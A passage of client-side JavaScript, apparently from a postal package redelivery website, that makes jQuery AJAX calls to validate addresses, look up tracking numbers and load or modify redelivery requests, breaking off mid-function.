// AJAX Calls for Redelivery

var redeliveryusrIp = "";
var selectedRedeliveryItems = [];
var userInformation = {};
var redeliveryInformation = {};
var cancelData = "";

// PASS N FAIL
var confirmationNumbers = [];
var failTracking = [];

// Get the redelivery Locations and Type of Redeliveries
var redeliveryLocationSelectable = "";
var redeliveryTypeSelectable = "";



function getRedeliveryLocations() {
    jQuery.ajax({
        url: "/ctrs/redelivery/locations",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var allLocations = resp;

            jQuery.each(allLocations, function (locIndex, locationInformation) {

                redeliveryLocationSelectable = redeliveryLocationSelectable + "<option value=\"" + locationInformation.name + "\">" + locationInformation.displayName + "</option>";

            });
        }
    });
}

function getPostalHolidays() {
    jQuery.ajax({
        url: "/ctrs/redelivery/postalBusinessDays",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            // take each year

            $.each(resp, function (pbdYear, pbdYearHolidays) {

                var holidayList = pbdYearHolidays.holidays;

                $.each(holidayList, function (holidayIndex, holidayData) {


                    holidays.push(moment(holidayData.delivery, "YYYYMMDD").format("M/D/YYYY"));

                });

            });
        }
    });
}

function getLinx() {
    jQuery.ajax({
        url: "/ctrs/redelivery/loadLinks",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {


            $("#termsConditionsLink").attr('href', resp.Terms);
            var termsChange = resp.xsell.replace("CHANGEMEHERE", "REDELIVERY");

            $("#yes-radio").data("xsellLink", termsChange);
        }
    });
}


function getRedeliveryTypes() {
    jQuery.ajax({
        url: "/ctrs/redelivery/types",
        type: "GET",
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {


            var allTypes = resp;

            jQuery.each(allTypes, function (tpIndex, typeInformation) {

                redeliveryTypeSelectable = redeliveryTypeSelectable + "<option value=\"" + typeInformation.name + "\">" + typeInformation.displayName + "</option>";

            });
        }
    });
}


function crossSellAddressValidate(data) {
    jQuery.ajax({
        url: "/ctrs/redelivery/crossSellAddress",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            if (resp.addressIDXS == "true") {
                $(".step-four-drawer").show();
                $(".step-three-drawer .confirm-button-wrapper").show();
                $(".step-three-drawer .submit-wrapper").hide();
            } else if (resp.addressIDXS == "false") {
                $(".step-four-drawer").hide();
                $(".step-three-drawer .confirm-button-wrapper").hide();
                $(".step-three-drawer .submit-wrapper").show();
            }

        }
    });

}

function validateAddress() {


    var addressLineOne = $("#addressLineOne").val();
    var addressLineTwo = $("#addressLineTwo").val();
    var city = $("#city").val();
    var state = $("#state").val();
    var zipCode = $("#zipCode").val();



    var data = {

        addressLineOne: addressLineOne,
        addressLineTwo: addressLineTwo,
        city: city,
        state: state,
        zip: zipCode
    };

    jQuery.ajax({
        url: "/ctrs/redelivery/validateAddress",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            $('.white-spinner-progress').removeClass('spinnerWhite');
            $(".white-spinner-wrapper").hide();


            $(".step-three-drawer .confirm-button-wrapper").hide();
            $(".step-three-drawer .submit-wrapper").show();

            if (resp.idAddressYes) {
                $(".step-four-drawer").show();
                $(".step-three-drawer .confirm-button-wrapper").show();
                $(".step-three-drawer .submit-wrapper").hide();
            }


            switch (resp.addressMatchType) {
                case "ADDRESS NOT FOUND":

                    $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
                    $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
                    $("#verifiedALastName").text($("#lastName").val().toUpperCase());
                    if ($("#companyName").val() != "") {
                        $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                        $("#verifiedCompanyLine").removeClass("hidden");

                    }

                    $("#verifiedAPhone").text($("#phone").val().toUpperCase());
                    $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

                    $("#verifiedAAddressLineOne").text($("#addressLineOne").val().toUpperCase());
                    $("#verifiedACityStateZip").text($("#city").val().toUpperCase() + ", " + $("#state").val().toUpperCase() + " " + $("#zipCode").val().toUpperCase());


                    $(".redelivery-unavailable-wrapper").show();
                    $(".redelivery-available-wrapper").hide();
                    $(".step-two-drawer").hide();
                    $(".step-three-drawer").hide();
                    if ($('.step-two-drawer').hasClass('disabled')) {
                        $('.step-four-drawer').hide();
                    } else if ($('.step-two-drawer').is(':hidden')) {
                        $('.step-four-drawer').hide();
                    } else {
                        $('.step-four-drawer').hide();
                    }
                    $(".unqualified-informed-delivery").toggle();

                    jQuery('#checkAvailabilityModal').modal('hide');
                    $('.step-one-validation').show();
                    $('.step-one-form').hide();

                    break;

                case "INVALID-CITY":

                    $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
                    $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
                    $("#verifiedALastName").text($("#lastName").val().toUpperCase());
                    if ($("#companyName").val() != "") {
                        $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                        $("#verifiedCompanyLine").removeClass("hidden");

                    }

                    $("#verifiedAPhone").text($("#phone").val().toUpperCase());
                    $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

                    $("#verifiedAAddressLineOne").text($("#addressLineOne").val().toUpperCase());
                    $("#verifiedACityStateZip").text($("#city").val().toUpperCase() + ", " + $("#state").val().toUpperCase() + " " + $("#zipCode").val().toUpperCase());


                    $(".redelivery-unavailable-wrapper").show();
                    $(".redelivery-available-wrapper").hide();
                    $(".step-two-drawer").hide();
                    $(".step-three-drawer").hide();
                    if ($('.step-two-drawer').hasClass('disabled')) {
                        $('.step-four-drawer').hide();
                    } else if ($('.step-two-drawer').is(':hidden')) {
                        $('.step-four-drawer').hide();
                    } else {
                        $('.step-four-drawer').hide();
                    }
                    $(".unqualified-informed-delivery").toggle();

                    jQuery('#checkAvailabilityModal').modal('hide');
                    $('.step-one-validation').show();
                    $('.step-one-form').hide();

                    break;

                case "DEFAULT MATCH":
                    /*var allAddressMatch = resp.allAddressMatches;
                    //                    multipleMatchAddresses(addressMatch);
                    var addressVal = resp.defaultMatch;*/
                    /*getRedeliveryServiceAvailability(resp);*/
                    getMultipleAddressModal(resp);
                    jQuery("#checkAvailabilityModal").modal('show');
                    break;
                case "MULTIPLE RESPONSE":
                    /*var allAddressMatch = resp.allAddressMatches;
                    //                    multipleMatchAddresses(addressMatch);
                    var addressVal = resp.defaultMatch;*/
                    /*getRedeliveryServiceAvailability(resp);*/
                    getMultipleAddressModal(resp);
                    jQuery("#checkAvailabilityModal").modal('show');
                    break;
                case "EXACT MATCH":
                    var addressVal = resp.defaultMatch;
                    getRedeliveryServiceAvailability(addressVal);
                    break;
                default:
                    $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
                    $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
                    $("#verifiedALastName").text($("#lastName").val().toUpperCase());
                    if ($("#companyName").val() != "") {
                        $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                        $("#verifiedCompanyLine").removeClass("hidden");

                    }

                    $("#verifiedAPhone").text($("#phone").val().toUpperCase());
                    $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

                    $("#verifiedAAddressLineOne").text($("#addressLineOne").val().toUpperCase());
                    $("#verifiedACityStateZip").text($("#city").val().toUpperCase() + ", " + $("#state").val().toUpperCase() + " " + $("#zipCode").val().toUpperCase());


                    $(".redelivery-unavailable-wrapper").show();
                    $(".redelivery-available-wrapper").hide();
                    $(".step-two-drawer").hide();
                    $(".step-three-drawer").hide();
                    if ($('.step-two-drawer').hasClass('disabled')) {
                        $('.step-four-drawer').hide();
                    } else if ($('.step-two-drawer').is(':hidden')) {
                        $('.step-four-drawer').hide();
                    } else {
                        $('.step-four-drawer').hide();
                    }
                    $(".unqualified-informed-delivery").toggle();

                    jQuery('#checkAvailabilityModal').modal('hide');
                    $('.step-one-validation').show();
                    $('.step-one-form').hide();
            }
        },
        error: function (respCode) {
            $('.white-spinner-progress').removeClass('spinnerWhite');
            $(".white-spinner-wrapper").hide();

            $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
            $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
            $("#verifiedALastName").text($("#lastName").val().toUpperCase());
            if ($("#companyName").val() != "") {
                $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                $("#verifiedCompanyLine").removeClass("hidden");

            }

            $("#verifiedAPhone").text($("#phone").val().toUpperCase());
            $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

            $("#verifiedAAddressLineOne").text($("#addressLineOne").val().toUpperCase());
            $("#verifiedACityStateZip").text($("#city").val().toUpperCase() + ", " + $("#state").val().toUpperCase() + " " + $("#zipCode").val().toUpperCase());


            $(".redelivery-unavailable-wrapper").show();
            $(".redelivery-available-wrapper").hide();
            $(".step-two-drawer").hide();
            $(".step-three-drawer").hide();
            if ($('.step-two-drawer').hasClass('disabled')) {
                $('.step-four-drawer').hide();
            } else if ($('.step-two-drawer').is(':hidden')) {
                $('.step-four-drawer').hide();
            } else {
                $('.step-four-drawer').hide();
            }
            $(".unqualified-informed-delivery").toggle();

            jQuery('#checkAvailabilityModal').modal('hide');
            $('.step-one-validation').show();
            $('.step-one-form').hide();

        }
    });
}

function getMultipleAddressModal(resp) {

    var addressVerifyListHtml = "";

    var addressList = resp.allAddressMatches;

    foundAddresses = addressList;


    jQuery("#enteredAddress").text(resp.defaultMatch.addressLine1);
    jQuery("#enteredCityStateZip").text(resp.defaultMatch.city + " " + resp.defaultMatch.state + " " + resp.defaultMatch.zip5);


    jQuery.each(addressList, function (listId, listValue) {
        var rowId = Math.random().toString(36).substr(2, 5);
        addressVerifyListHtml = addressVerifyListHtml + "<div class=\"col-md-12 col-sm-12 col-xs-12 schedule-pick-up-radio-container radio-container step-one-radio\" style=\"background-color: rgb(255, 255, 255);\">" +
            "<input type=\"radio\" id=\"" + listId + "\" class=\"step-one-radio radio-button\" name=\"selectValidAddress\">" +
            "<label for=\"" + listId + "\">" +
            "<ul class=\"schedule-pickup\">" +
            "<li>" + listValue.addressLine1 + " " + listValue.city + " " + listValue.state + " " + listValue.postalCode + "</li>" +
            "</ul>" +
            "</label>" +
            "</div>";
        //        foundAddresses[listId] = listValue;
    });

    jQuery("#pickaPlace").html(addressVerifyListHtml);
}


function getRedeliveryServiceAvailability(addressData) {
    var data = {

        addressLineOne: addressData.addressLine1,
        city: addressData.city,
        state: addressData.state,
        zip5: addressData.zip5,
        zip4: addressData.zipPlus4,
        carrierRoute: addressData.carrierRoute,
        urbanizationCode: addressData.urbanizationCode

    };

    crossSellAddressValidate(data);
    $("#verifiedUrbCode").text(addressData.urbanizationCode);
    jQuery.ajax({
        url: "/ctrs/redelivery/checkAddress",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {
            var addressData = resp[0].address;

            //If Address in eligible
            var addressEligibilty = resp[0].code;
            var dataString = this.data;
            var dataError = dataString.split(",");
            var inEligibleStreetAddrOne = dataError[0].replace("{\"addressLineOne\":\"", "").replace("\"", "");
            var inEligibleCity = dataError[1].replace("\"city\":\"", "").replace("\"", "");
            var inEligibleState = dataError[2].replace("\"state\":\"", "").replace("\"", "");
            var inEligibleZip5 = dataError[3].replace("\"zip5\":\"", "").replace("\"", "");
            var inEligibleZip4 = dataError[4].replace("\"zip4\":\"", "").replace("\"", "");


            if (addressEligibilty == 1006) {

                $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
                $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
                $("#verifiedALastName").text($("#lastName").val().toUpperCase());
                if ($("#companyName").val() != "") {
                    $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                    $("#verifiedCompanyLine").removeClass("hidden");

                }

                $("#verifiedAPhone").text($("#phone").val().toUpperCase());
                $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

                $("#verifiedAAddressLineOne").text(inEligibleStreetAddrOne);
                $("#verifiedACityStateZip").text(inEligibleCity + ", " + inEligibleState + " " + inEligibleZip5 + "-" + inEligibleZip4);


                $(".redelivery-unavailable-wrapper").show();
                $(".redelivery-available-wrapper").hide();
                $(".step-two-drawer").hide();
                $(".step-three-drawer").hide();
                if ($('.step-two-drawer').hasClass('disabled')) {
                    $('.step-four-drawer').hide();
                } else if ($('.step-two-drawer').is(':hidden')) {
                    $('.step-four-drawer').hide();
                } else {
                    $('.step-four-drawer').hide();
                }
                $(".unqualified-informed-delivery").toggle();

                jQuery('#checkAvailabilityModal').modal('hide');
                $('.step-one-validation').show();
                $('.step-one-form').hide();

            } else if (addressEligibilty == 1020 || addressEligibilty == 1007 || addressEligibilty == 1011 || addressEligibilty == 1022 || addressEligibilty == 1021 || addressEligibilty == 1028 || addressEligibilty == 1024 || addressEligibilty == 1004 || addressEligibilty == 1014 || addressEligibilty == 1040 || addressEligibilty == 1039 || addressEligibilty == 1002 || addressEligibilty == 1013 || addressEligibilty == 1025) {

                $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
                $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
                $("#verifiedALastName").text($("#lastName").val().toUpperCase());
                if ($("#companyName").val() != "") {
                    $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                    $("#verifiedCompanyLine").removeClass("hidden");

                }
                $("#verifiedAPhone").text($("#phone").val().toUpperCase());
                $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

                $("#verifiedAAddressLineOne").text(inEligibleStreetAddrOne);
                $("#verifiedACityStateZip").text(inEligibleCity + ", " + inEligibleState + " " + inEligibleZip5 + "-" + inEligibleZip4);


                $(".redelivery-unavailable-wrapper").show();
                $(".redelivery-available-wrapper").hide();
                $(".step-two-drawer").hide();
                $(".step-three-drawer").hide();
                if ($('.step-two-drawer').hasClass('disabled')) {
                    $('.step-four-drawer').hide();
                } else if ($('.step-two-drawer').is(':hidden')) {
                    $('.step-four-drawer').hide();
                } else {
                    $('.step-four-drawer').hide();
                }
                $(".unqualified-informed-delivery").toggle();

                jQuery('#checkAvailabilityModal').modal('hide');
                $('.step-one-validation').show();
                $('.step-one-form').hide();

            } else {

                $("#verifiedAFirstName").text($("#firstName").val().toUpperCase());
                $("#verifiedAMiddleName").text($("#middleInitial").val().toUpperCase());
                $("#verifiedALastName").text($("#lastName").val().toUpperCase());
                if ($("#companyName").val() != "") {
                    $("#verifiedACompanyName").text($("#companyName").val().toUpperCase());
                    $("#verifiedCompanyLine").removeClass("hidden");

                }

                /*if ($("#urbanizationCode").val() != "") {
                    $("#verifiedUrbCode").text($("#urbanizationCode").val());
                    $("#verifiedUrb").removeClass("hidden");
                }*/

                $("#verifiedUrbCode").text(addressData.urbanizationCode);

                $("#verifiedAAddressLineOne").text(addressData.line1);
                var addressLineTwoResult = addressData.line2;

                if (addressLineTwoResult && addressLineTwoResult != "NULL") {
                    $("#verifiedAAddressLineTwo").text(addressLineTwoResult);
                    $("#verifiedAddLTwoLine").removeClass("hidden");
                }

                $("#verifiedACityStateZip").text(addressData.city + ", " + addressData.state + " " + addressData.postalCode + "-" + addressData.postalCodeExtended);

                $("#verifiedAPhone").text($("#phone").val().toUpperCase());
                $("#verifiedAEmailAddress").text($("#emailAddress").val().toUpperCase());

                $('.step-one-validation').show();
                $('.step-one-form').hide();
                $('.step-one-drawer').addClass('step-complete');
                $('.step-one-drawer').removeClass('current-step');
                $('.step-two-drawer').addClass('active current-step');
                $('.step-two-drawer').removeClass('disabled');
                $('.review-error-wrapper').removeClass('error');

                /// Hide Errors
                $(".redelivery-unavailable-wrapper").hide();
                $(".redelivery-available-wrapper").show();
                $(".step-two-drawer").show();
                $(".step-three-drawer").show();


                if ($('.step-two-drawer').hasClass('disabled')) {
                    $('.step-four-drawer').hide();
                } else if ($('.step-two-drawer').is(':hidden')) {
                    $('.step-four-drawer').hide();
                } else {
                    //					$('.step-four-drawer').hide();
                }


                jQuery('#checkAvailabilityModal').modal('hide');


                userInformation.addressLineOne = addressData.line1;
                if (addressLineTwoResult && addressLineTwoResult != "NULL") {
                    userInformation.addressLineTwo = (addressLineTwoResult);
                }
                userInformation.city = addressData.city;
                userInformation.state = addressData.state;
                userInformation.zip5 = addressData.postalCode;
                userInformation.zip4 = addressData.postalCodeExtended;


                userInformation.firstName = $("#firstName").val().toUpperCase();
                userInformation.middleName = $("#middleInitial").val().toUpperCase();
                userInformation.lastName = $("#lastName").val().toUpperCase();
                if ($("#companyName").val() != "") {
                    userInformation.companyName = $("#companyName").val().toUpperCase();
                }

                var phoneDigits = $("#phone").val();
                // remove all non-numbers
                phoneDigits = phoneDigits.replace(/[^\d]/g, "");
                var phoneSplit = phoneDigits.match(/(\d{3})(\d{3})(\d{4})/);

                userInformation.phoneAreaCode = phoneSplit[1];
                userInformation.phoneExchange = phoneSplit[2];
                userInformation.phoneLine = phoneSplit[3];

                userInformation.emailAddress = $("#emailAddress").val().toUpperCase();
            }
        }


    });
}


function packagesLookupAddressMatch(trackingReturns) {




    // get the Address
    var data = {};

    data.addressLineOne = userInformation.addressLineOne;
    data.addressLineTwo = userInformation.addressLineTwo;
    data.city = userInformation.city;
    data.state = userInformation.state;
    data.zipCode = userInformation.zip5;

    $.each(trackingReturns, function (trackingNumberRes, ptrData) {

        data.trackingNumber = trackingNumberRes;

        jQuery.ajax({
            url: "/ctrs/redelivery/addressValidate",
            type: "POST",
            data: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json;charset=utf-8"
            },
            dataType: "json",
            success: function (resp) {

                trackingReturns[trackingNumberRes].addressMatch = resp;
                packageSectionBuilder(trackingReturns);
            },
            error: function () {
                packageSectionBuilder(trackingReturns);
            }

        });

    });




}

function packageSectionBuilder(trackingReturns) {
    $(".tracking-results-wrapper").show();
    var searchItem = jQuery("#tracking-barcode-search").val().trim();
    $('.white-spinner-progress').removeClass('spinnerWhite');
    $(".white-spinner-wrapper").hide();

    var is3849BC = searchItem.substr(0, 2);

    if (is3849BC == "52") {
        $(".showing-results").removeClass("hidden");

        var splitNumbers = searchItem.replace(/ /g, "");
        splitNumbers = splitNumbers.replace(/.{4}/g, "$&" + " ");

        jQuery("#barCodeNumber").text(splitNumbers);
    } else {
        $(".showing-results").removeClass("hidden");
        $("#results-barcode-or-tracking").text("result for tracking number");

        jQuery("#barCodeNumber").text(searchItem);

    }
    $("#redeliveryTrackingBreakdown").html("");


    /*if (resp.NotEligible) {
    	$("#service-unavailable-modal").modal('show');
        jQuery("#trackingNumErrorMessage").parent().addClass("error");
    }*/


    var totalPackages = 0;
    $.each(trackingReturns, function (trackingNumberRes, ptrData) {

        selectedRedeliveryItems.push(trackingNumberRes);

        if (trackingNumberRes != "NotEligible") {
            totalPackages = totalPackages + 1;
            var visualData = buildRedeliveryStep2(trackingNumberRes, ptrData);
            $("#redeliveryTrackingBreakdown").append(visualData);
            calendarCreator("#resume-start-cal", trackingNumberRes);
            
            
            jQuery("#redeliveryType-" + trackingNumberRes).on('change', function () {
                jQuery(".selectRed").hide();
                
                setTimeout(function(){$(".selectRed").parents(".review-error-wrapper").removeClass("error");},250);
                
            });


            // now make the calendar work - > hmm... 
            $('#select-date-' + trackingNumberRes).click(function () {

                // Add this logic for the rare case that its before 8 to test?

                //if(moment())

                // set the max date before the return date?
                var rtsDate = moment(ptrData.returnToSenderDate, "MMM DD, YYYY");
                var rtsCal = moment(ptrData.returnToSenderDate, "MMM DD, YYYY").subtract('1', 'days');
                $('#resume-start-cal').datepicker("option", "maxDate", rtsCal.format("MM/DD/YYYY"));

                var rightnowGMT = moment.utc();
                var cutoffTime = moment.utc("07:00", "HH:mm");

                // 7 AM  UTC  = 2AM Central


                if (rightnowGMT.isBefore(cutoffTime)) {
                    $('#resume-start-cal').datepicker("option", "minDate", rightnowGMT.format("MM/DD/YYYY"));
                }

                jQuery("#save-resume-date").data("thisTracking", trackingNumberRes);
                if (jQuery(this).val()) {
                    var selectedDate = jQuery(this).val();
                    $("#modal-resume-date").val(selectedDate);
                    $('#resume-start-cal').datepicker('setDate', selectedDate);
                } else {

                    // unset the date
                    $("#modal-resume-date").val(null);
                }

            });


        }
    });

    reenableFunctions();

    jQuery("#total-packages-overall").text(totalPackages);

    if (totalPackages == 0) {
        jQuery("#trackingNumErrorMessage").parent().addClass("error");
        jQuery(".tracking-results-wrapper").hide();
    }
}

function packagesLookup() {
    jQuery(".tracking-results-wrapper").hide();
    $('.step-two-drawer').addClass('edit-step current-step');
    $('.step-two-drawer').removeClass('step-complete');
    $('.step-two-drawer').unbind('click touch');
    $('.step-three-drawer, .confirm-modification-step').removeClass('active');
    $('.step-three-drawer, .confirm-modification-step').removeClass('current-step');
    $('.step-three-drawer').addClass('disabled');
    $('.confirm-modification-step').addClass('disabled');
    $('.review-error-wrapper').removeClass('error');

    // get the tracking number or 3849 from the search field.
    var searchItem = jQuery("#tracking-barcode-search").val().trim();
    var currentIp = redeliveryusrIp;
    var data = {

        trackingNumbers: searchItem,
        clientIp: currentIp

    };
    jQuery.ajax({
        url: "/ctrs/redelivery/searchArticle",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            trackingNumberEligibleCCC(resp);
        },
        error: function (respCode) {
            $('.white-spinner-progress').removeClass('spinnerWhite');
            $(".white-spinner-wrapper").hide();
            $("#service-unavailable-modal").modal('show');

            $(".tracking-results-wrapper").hide();

        }
    });



}


function packagesModifyLookup(searchItem, redeliveryType) {
    jQuery(".column-item-container").html("");
    var currentIp = redeliveryusrIp;
    var data = {

        trackingNumbers: searchItem,
        clientIp: currentIp

    };
    jQuery.ajax({
        url: "/ctrs/redelivery/searchArticle",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            $('.white-spinner-progress').removeClass('spinnerWhite');
            $(".white-spinner-wrapper").hide();

            //Since these are tracking numbers - add it like before
            if (!resp.NotEligible) {
                var resultInfo = buildModifyPackageDetails(searchItem, resp, redeliveryType);
                jQuery(".column-item-container").append(resultInfo);
            } else {
                console.log("PTR Cannot Find Package Error?");
            }
            reenableModifyFunctions();

        },
        error: function (respCode) {
            $('.white-spinner-progress').removeClass('spinnerWhite');
            $(".white-spinner-wrapper").hide();
            $("#service-unavailable-modal").modal('show');

            // TEMP
            reenableModifyFunctions();

        }
    });



}


function lookupRedelivery(confirmNumber, email, phone) {
    var data = {

        confirmationNumber: confirmNumber,
        phoneNumber: phone,
        emailAddress: email

    };
    jQuery.ajax({
        url: "/ctrs/redelivery/lookupRedelivery",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var stepInfo = {};

            stepInfo.modifyConfNum = resp.confirmation;
            actionListWithParams("step3", stepInfo);

            if (typeof resp.confirmation !== 'undefined') {
                window.open("/resources/modify-redelivery.htm?confirmation=" + resp.confirmation, "_self");
            } else {
                /*jQuery("#confirmationNumberErrorMessage").parent().addClass("error");*/

                jQuery("#appointmentErrorContainer").show();
                jQuery("#appointmentError").parent().addClass("error");
                jQuery("#appointmentError").text("We could not find a Redelivery Request with the information you entered. Please confirm your information and try again.");

                jQuery(".closeModalModify").click(function () {
                    jQuery("#appointmentErrorContainer").hide();
                });
            }

        },
        error: function (respCode) {}
    });


}

function loadRedelivery(confirmNumber) {

    cancelData = confirmNumber;
    var data = {

        confirmationNumber: confirmNumber,

    };
    jQuery.ajax({
        url: "/ctrs/redelivery/loadExistingRedelivery",
        type: "POST",
        async: false,
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var addressInfo = resp.address;
            var customerInfo = resp.customer;
            var phoneInfo = resp.phone;
            var itemsInfo = resp.redeliveryItem;
            var confirmationNumber = resp.confirmationNumber;
            var emailAddress = resp.emailAddress;

            var itemCount = resp.redeliveryItem.length;

            var currentRedeliveryStatus = resp.status;

            var isDateFuture = resp.isValidDate;

            //			jQuery(".barcode-number-header").text("Tracking Number");
            //			jQuery("#modifyBarcodeNumber").text(resp.redeliveryItem[0].trackingNumber);


            jQuery(".barcode-number-header").hide();
            jQuery("#modifyBarcodeNumber").hide();


            jQuery("#modifyFirstLastName").text(customerInfo.firstName + " " + customerInfo.lastName);
            if (customerInfo.middleName && customerInfo.middleName != "") {
                jQuery("#modifyFirstLastName").text(customerInfo.firstName + " " + customerInfo.middleName + " " + customerInfo.lastName);
            }
            //Check for company
            if (!customerInfo.organizationName) {
                jQuery("#modifyCompanyName").hide();
            }

            jQuery("#modifyCompanyName").text(customerInfo.organizationName);

            var addressInfoBlock = addressInfo.line1;
            if (addressInfo.line2) {
                addressInfoBlock = addressInfoBlock + " " + addressInfo.line2;
            }

            // hide this redelivery-details-wrapper 

            jQuery("#modifyAddress").text(addressInfoBlock);
            jQuery("#modifyCityStateZip").text(addressInfo.city + ", " + addressInfo.state + " " + addressInfo.postalCode + "-" + addressInfo.postalCodeExtended);
            jQuery("#modifyDestinationZip").val(addressInfo.postalCode);
            jQuery("#modifyPhone").text(phoneInfo.areaCode + "-" + phoneInfo.exchange + "-" + phoneInfo.line);
            jQuery("#modifyEmailAddress").text(emailAddress);
            jQuery("#modifyConfirmationNumberBold").text(confirmationNumber);
            jQuery("#modifyConfirmationNumber").text(confirmationNumber);
            var packagesWording = " Packages";
            if (itemCount == 1) {
                packagesWording = " Package";
            }
            jQuery("#modifyTotalPackages").text(itemCount + packagesWording);

            setTimeout(function () {

                jQuery("#modifyTypeDropdown").append(redeliveryTypeSelectable);
                jQuery("#modifyLocationDropdown").append(redeliveryLocationSelectable);

                // Now Setup the selections about the redelivery
                setModifyRedeliveryOptions(resp);

            }, 750);

            if (currentRedeliveryStatus == "CANCELLED" || currentRedeliveryStatus == "CLOSED") {
                // no mods
                $(".redelivery-details-wrapper").hide();
                $(".update-request-button-wrapper").hide();
                $(".step-two-drawer").hide();
                //no cancel
                $(".cancel-request-wrapper").hide();

                // show Errors 
                $("#modifyExpired").show();
                $(".modify-step-alert-message-wrapper").show();
            } else if (isDateFuture == "false") {
                // no mods
                $(".redelivery-details-wrapper").hide();
                $(".update-request-button-wrapper").hide();
                $(".step-two-drawer").hide();
                //no cancel
                $(".cancel-request-wrapper").hide();

                // show Errors
                $("#modifyNoLongerChange").show();
                $(".modify-step-alert-message-wrapper").show();


            }

        },
        error: function (respCode) {}
    });
}

function setModifyRedeliveryOptions(opts) {


    var redeliveryDate = moment(opts.redeliveryDate, "YYYYMMDD").format("MM/DD/YYYY");

    var text_max = "250";
    var text_length = "0";
    if (opts.comment) {
        text_length = opts.comment.length;
    }
    $("#additional-instructions-modify").parents('.form-wrapper').find('.count_message').html(text_length + '/' + text_max);

    switch (opts.type) {
        case "REDELIVERY":
            jQuery("#modifyTypeDropdown").val(opts.type);
            jQuery("#modifyLocationDropdown").val(opts.location);
            jQuery("#select-date-modify").val(redeliveryDate);
            jQuery("#additional-instructions-modify").val(opts.comment);
            $("#modifyTypeDropdown").closest('.redelivery-details-wrapper').removeClass('pickup-redelivery return-sender-redelivery').addClass('carrier-redelivery');
            $("#modifyTypeDropdown").closest('.additional-instructions-wrapper').removeClass('col-md-5 col-sm-5').addClass('col-md-10 col-sm-10');
            $("#modifyTypeDropdown").closest('.carrier-redeliver-required').show();
            break;
        case "CUSTOMER_PICKUP":
            jQuery("#modifyTypeDropdown").val(opts.type);
            jQuery("#select-date-modify").val(redeliveryDate);
            jQuery("#additional-instructions-modify").val(opts.comment);
            $("#modifyTypeDropdown").closest('.redelivery-details-wrapper').removeClass('carrier-redelivery return-sender-redelivery').addClass('pickup-redelivery');
            $("#modifyTypeDropdown").closest('.additional-instructions-wrapper').removeClass('col-md-5 col-sm-5').addClass('col-md-10 col-sm-10');
            $("#modifyTypeDropdown").closest('.carrier-redeliver-required').hide();
            $("#modifyTypeDropdown").closest('.additional-instructions-wrapper').removeClass('required-field error');
            $("#modifyTypeDropdown").closest('.receive-confirmation-wrapper').show();
            if (opts.pickupRepresentative) {
                var pickupRepDetail = opts.pickupRepresentative;
                //check the box and fill out the name
                $("#representative-for-modify").attr('checked', true);
                $("#representative-for-modify").closest('.redelivery-pickup-wrapper').find('.representative-requirements-wrapper').show();
                $("#representative-for-modify").closest('.redelivery-pickup-wrapper').find('.id-pickup').show();
                $("#modifyRepLast").val(pickupRepDetail.lastName);
                $("#modifyRepFirst").val(pickupRepDetail.firstName);
                $("#modifyRepMiddle").val(pickupRepDetail.middleName);
            }

            break;
        case "RETURN":
            // no mods
            $(".redelivery-details-wrapper").hide();
            $(".update-request-button-wrapper").hide();
            $(".step-two-drawer").hide();
            //no cancel
            $(".cancel-request-wrapper").hide();

            // show Errors
            $("#modifyNoLongerReturn").show();
            $(".modify-step-alert-message-wrapper").show();
            // Scroll to the error
            $('html, body').animate({
                scrollTop: $(".step-one-drawer").offset().top
            }, 500);
            
            break;

        default:
            console.log("Error: No Type");
    }

    // Now enable the changes...

    calendarCreator("#resume-start-cal", "");





    // Clear Results Display


    jQuery.each(opts.redeliveryItem, function (mdIndex, mdData) {

        // Add Each Tracking Number to the Edit
        selectedRedeliveryItems.push(mdData.trackingNumber);

        packagesModifyLookup(mdData.trackingNumber, opts.type);

    });


}

function confirmRedelivery(confirmNumber) {
    var data = {

